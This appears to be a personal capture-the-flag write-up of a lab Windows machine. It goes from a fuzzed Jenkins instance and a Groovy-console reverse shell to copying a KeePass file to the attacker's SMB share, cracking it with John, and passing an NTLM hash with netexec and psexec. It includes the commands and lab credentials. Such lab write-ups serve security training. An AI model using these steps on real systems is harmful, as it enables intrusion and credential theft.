![[Pasted image 20250422014359.png]]
[[nmap]] reports [[port 80]] and checking it looks like a [[rabbit hole]] on port 80, if you [[fuzzing]] port 500000 we found path `/askjeeves` with a [[Jenkins]] running.

inside of `jenkins` we can find a console to execute [[Groovy]] scripts.
we can try use [[Impacket]] with his script [[smbserver.py]] to share a [[nc.exe]] and after force the target machine connect to us.

Start [[smb]] shared folder.
```bash
sudo smbserver.py smbFolder $(pwd) -smb2support
```

start listen on a port 9001 on our host machine.

And start the connection in Jenkins groovy console.
![[Pasted image 20250422015619.png]]
at execute the command we see the connection
![[Pasted image 20250422015643.png]]
if we check the directories of user `kohsuke` we found interesting file
![[Pasted image 20250422020957.png]]
`CEH.kdbx` where `.kdbx` is a extension of [[KeePass]]. Then lets take us to our machine that file, approach the `smb` shared folder are active.

```powershell
copy CEH.kdbx \\10.10.16.2\\smbFolder\CEH.kdbx
```

one with the file on our host machine we can use [[keepassxc]] to try open the file but need a password, so
let's use [[keepass2john]] to get a hash of the password we need. With that hash we can use [[JohnTheRipper]] to try break that.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
![[Pasted image 20250422022315.png]]

and we got the password `moonshine1`.

once inside we have this:
![[Pasted image 20250422022800.png]]
if copy `Backup stuff` password we have a [[NTML]] pass, `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
`
we can check if that password is of Administrator user. 
using [[netexec]] we can check that.

```bash
netexec smb 10.10.10.63 -u 'Administrator' -H 'e0fb1fb85756c24235ff238cbe81fe00'
```
![[Pasted image 20250422023539.png]]
and say pwn3d!, so its valid credential, we can try do [[Pass the hash]] with [[psexec.py]]

```bash
psexec.py WORKGROUP/Administrator@10.10.10.63 -hashes :e0fb1fb85756c24235ff238cbe81fe00
```
![[Pasted image 20250422024830.png]]